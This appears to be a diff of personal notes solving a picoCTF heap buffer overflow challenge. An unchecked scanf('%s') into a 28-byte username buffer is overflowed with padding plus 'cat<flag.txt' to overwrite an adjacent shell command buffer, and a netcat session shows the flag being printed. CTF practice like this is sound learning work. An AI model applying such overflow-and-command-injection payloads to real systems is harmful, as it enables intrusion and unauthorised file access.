@@ -1,0 +1,27 @@
+char* username = malloc(28);
+        char* shell = malloc(28);
+that the 2 buffer
+then it will print the address like 
+username at 0x2694c2a0
+shell at 0x2694c2d0
+16 bytes metadata
+32 bytes usable area
+so it will be 48 bytes?
+username (28 bytes) + heap metadata padding + shell buffer (28 bytes )
+scanf("%s", username);
+the part scan %s didnt check the size
+so use AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat<flag.txt
+username buffer (28 bytes)  filled with A's
+metadata (20 bytes?)  also overwritten  by those A
+shell buffer (start)  overwritten with: cat<flag.txt
+i try the cat flag.txt but it didnt work
+
+so i think 
+cat<flag.txt has no spaces and
+scanf("%s") treats this as a single token
+┌──(kali㉿lto)-[~/Downloads/picoctf]
+└─$ nc amiable-citadel.picoctf.net 52135
+username at 0x36dd2a0
+shell at 0x36dd2d0
+Enter username:  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat<flag.txt
+picoCTF{us3rn4m3_2_sh3ll_ac817f49}Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat<flag.txt. Your shell is cat<flag.txt.
